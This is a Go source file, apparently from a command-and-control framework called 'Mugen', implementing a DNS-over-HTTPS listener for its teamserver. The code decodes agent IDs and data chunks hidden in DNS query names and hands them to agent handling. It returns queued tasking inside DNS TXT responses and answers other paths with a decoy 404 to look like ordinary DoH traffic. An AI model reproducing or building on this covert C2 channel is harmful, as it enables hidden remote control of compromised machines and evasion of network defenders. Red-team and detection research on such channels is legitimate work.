package handlers

import (
	"io"
	"net/http"
	"strings"

	"Mugen/pkg/agent"
	"Mugen/pkg/colors"
	"Mugen/pkg/common"
	"Mugen/pkg/common/certs"
	"Mugen/pkg/logger"

	"github.com/gin-gonic/gin"
)

type DoHConfig struct {
	Name         string
	BindHost     string
	PortBind     string
	Domain       string // The base domain for QNAME matching
	KillDate     int64
	WorkingHours string
	Secure       bool
	Cert         struct {
		Cert string
		Key  string
	}
}

type DoH struct {
	Config    DoHConfig
	Teamserver agent.TeamServer
	Active    bool
	Server    *http.Server
	engine    *gin.Engine
	state     *dnsState

	TLS struct {
		Cert []byte
		Key  []byte
		CertPath string
		KeyPath  string
	}
}

func NewDoH() *DoH {
	d := &DoH{state: newDNSState()}
	d.engine = gin.New()
	return d
}

func (d *DoH) Start() {
	d.engine.POST("/dns-query", d.handleDoH)
	d.engine.GET("/*path", d.fake404)
	d.Active = true

	addr := common.GetInterfaceIpv4Addr(d.Config.BindHost) + ":" + d.Config.PortBind

	if d.Config.Secure {
		cert, key, err := certs.HTTPSGenerateRSACertificate(common.GetInterfaceIpv4Addr(d.Config.BindHost))
		if err != nil {
			logger.Error("DoH: TLS cert generation failed: " + err.Error())
			return
		}
		d.TLS.Cert = cert
		d.TLS.Key = key

		logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" DoH listener: " +
			colors.BlueUnderline("https://"+addr+"/dns-query") + " domain=" + d.Config.Domain)

		pk := d.Teamserver.ListenerAdd("", LISTENER_DOH, d)
		d.Teamserver.EventAppend(pk)
		d.Teamserver.EventBroadcast("", pk)

		go func() {
			d.Server = &http.Server{Addr: addr, Handler: d.engine}
			if e := d.Server.ListenAndServeTLS(d.Config.Cert.Cert, d.Config.Cert.Key); e != nil && e != http.ErrServerClosed {
				logger.Error("DoH HTTPS: " + e.Error())
				d.Active = false
			}
		}()
	} else {
		logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" DoH listener: " +
			colors.BlueUnderline("http://"+addr+"/dns-query") + " domain=" + d.Config.Domain)

		pk := d.Teamserver.ListenerAdd("", LISTENER_DOH, d)
		d.Teamserver.EventAppend(pk)
		d.Teamserver.EventBroadcast("", pk)

		go func() {
			d.Server = &http.Server{Addr: addr, Handler: d.engine}
			if e := d.Server.ListenAndServe(); e != nil && e != http.ErrServerClosed {
				logger.Error("DoH HTTP: " + e.Error())
				d.Active = false
			}
		}()
	}
}

func (d *DoH) fake404(ctx *gin.Context) {
	ctx.Status(http.StatusNotFound)
}

func (d *DoH) handleDoH(ctx *gin.Context) {
	ct := ctx.GetHeader("Content-Type")
	if !strings.Contains(ct, "application/dns-message") {
		ctx.Status(http.StatusUnsupportedMediaType)
		return
	}

	body, err := io.ReadAll(ctx.Request.Body)
	if err != nil || len(body) == 0 {
		ctx.Status(http.StatusBadRequest)
		return
	}

	qname, txid, ok := dnsParseQueryQname(body)
	if !ok {
		ctx.Status(http.StatusBadRequest)
		return
	}

	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(d.Config.Domain)) {
		ctx.Status(http.StatusNotFound)
		return
	}

	externalIP := ctx.ClientIP()

	msgType, agentID, seq, tot, data, decErr := decodeQname(qname, d.Config.Domain)
	if decErr != nil {
		ctx.Status(http.StatusBadRequest)
		return
	}

	var respPayload []byte

	if msgType == dnsTypePoll {
		respPayload = d.state.dequeueChunk(agentID)
	} else if msgType == dnsTypeData {
		frame := d.state.acceptChunk(agentID, seq, tot, data)
		if frame == nil {
			respPayload = []byte{0x01} // ACK, not last chunk
		} else {
			resp, success := parseAgentRequest(d.Teamserver, frame, externalIP)
			if success && resp.Len() > 0 {
				d.state.queueResponse(agentID, resp.Bytes())
			}
			respPayload = d.state.dequeueChunk(agentID)
		}
	} else {
		respPayload = []byte{0x01}
	}

	respWire := dnsBuildTXTResponse(txid, qname, respPayload)

	ctx.Header("Content-Type", "application/dns-message")
	ctx.Header("Cache-Control", "no-cache")
	ctx.Data(http.StatusOK, "application/dns-message", respWire)
}

func (d *DoH) Stop() {
	d.Active = false
	if d.Server != nil {
		d.Server.Close()
	}
}
